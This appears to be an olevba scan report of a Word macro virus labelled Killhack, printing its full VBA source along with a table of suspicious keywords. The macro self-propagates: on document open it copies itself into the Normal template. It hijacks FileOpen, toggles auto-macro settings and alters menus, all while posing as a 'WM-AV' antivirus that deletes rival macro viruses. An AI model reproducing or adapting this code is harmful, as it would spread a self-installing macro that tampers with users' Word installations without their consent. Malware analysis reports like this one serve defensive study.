olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Killhack-f0b2b4c79f4769c4d6b192275207097df989d461
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Killhack-f0b2b4c79f4769c4d6b192275207097df989d461 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Kill_S129.bas 
in file: Virus.MSWord.Killhack-f0b2b4c79f4769c4d6b192275207097df989d461 - OLE stream: 'Macros/VBA/Kill_S129'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Dim Infected As Boolean
Dim NT, AD As Object


Sub AutoOpen()
  Dim installed As Boolean
  Dim im As Object
  Dim abt As CommandBarButton
  Dim i
  Dim oke As Boolean
  
  
  Set AD = ActiveDocument
  Set NT = NormalTemplate
  
  installed = False
  For Each im In NT.VBProject.VBComponents
     If im.Name = "Kill_S129" Then installed = True
  Next
  If Not (installed) Then
    Application.OrganizerCopy Source:=AD.FullName, Destination:=NT.FullName, Name:="Kill_S129", Object:=wdOrganizerObjectProjectItems
  End If
  
  Search_and_Kill
  oke = False
  For Each i In CommandBars("Help").Controls
    If i.Type = msoControlButton Then If i.Caption = "About Un2mU" Then oke = True
  Next
  If Not (oke) Then
    Set abt = CommandBars("Help").Controls.Add(Type:=msoControlButton)
    abt.Caption = "About Un2mU"
    abt.OnAction = "AboutUn2mU"
    abt.Enabled = True
    abt.Visible = True
    abt.Width = 79
    abt.Height = 19
    abt.Style = msoButtonIconAndCaption
  End If
End Sub
Sub FileOpen()
  Aof
  Dialogs(wdDialogFileOpen).Show
  Search_and_Kill
  Aon
End Sub
Sub RepairMenu()
Dim IC As CommandBarControl
Dim damaged As Boolean

On Error Resume Next
damaged = False
For Each IC In CommandBars("Help").Controls
  If IC.Caption = "Assalamu'alaikum Wr. Wb....." Then damaged = True
Next
If Not (damaged) Then
  For Each IC In CommandBars("Tools").Controls
    If IC.Caption = "Makmu, Cok.....!!!!" Then damaged = True
  Next
End If
If damaged Then
    MsgBox "Repair WORD from S129-effect", vbOKOnly, "Un2mU Virii division"
    CommandBars("Help").Controls("Assalamu'alaikum Wr. Wb.....").Caption = ("About Microsoft Word")
    CommandBars("Tools").Controls("Makmu, Cok.....!!!!").Caption = ("Macro")
    CommandBars("Tools").Controls("Tempe dan Tahu Enak...!!!").Caption = ("Templates and Add-ins...")
    CommandBars("Tools").Controls("Macro").Visible = True
    CommandBars("Tools").Controls("Macro").Enabled = True
    CommandBars("Tools").Controls("Templates and Add-ins...").Enabled = True
End If
Options.VirusProtection = True
Aon
End Sub

Sub Search_and_Kill()
  Dim im As Object
  On Error Resume Next
  Set AD = ActiveDocument
  Set NT = NormalTemplate
  For Each im In NT.VBProject.VBComponents
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "astia" Then
      MsgBox "Found & Kills virus Titasic at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "CyberHack" Or im.Name = "CyberForm" Then
      MsgBox "Found & Kills virus CyberHack/Dwiganteng at Normal template", vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
    
  Next
  For Each im In AD.VBProject.VBComponents
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "astia" Then
      MsgBox "Found & Kills virus Titasic at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    ElseIf im.Name = "CyberHack" Or im.Name = "CyberForm" Then
      MsgBox "Found & Kills virus CyberHack/Dwiganteng at " & AD.FullName, vbOKOnly, "Un2mU Virii division"
      Application.OrganizerDelete Source:=NT.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
    
    If im.Name = "S129" Or im.Name = "S129Form" Then
      MsgBox "Found & Kills virus S129 at " & AD.FullName, vbOKOnly, "Un2mU WM-AV Ver 1.3"
      Application.OrganizerDelete Source:=AD.FullName, Name:=im.Name, Object:=wdOrganizerObjectProjectItems
    End If
  Next
  
  RepairMenu
   
End Sub

Sub Aof()
  WordBasic.DisableAutoMacros True
End Sub

Sub Aon()
  WordBasic.DisableAutoMacros False
End Sub
Sub AboutUn2mU()
Dim s As String
s = "   Un2mU WM-AV Ver 1.3" & Chr(13) _
& "Made by david_ys@i.am (c) 1999" & Chr(13) _
& "   http://come.to/un2mu"
MsgBox s, vbOKOnly, "About Un2mU WM-AV"
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://come.to/un2mu|URL                                          |
+----------+--------------------+---------------------------------------------+

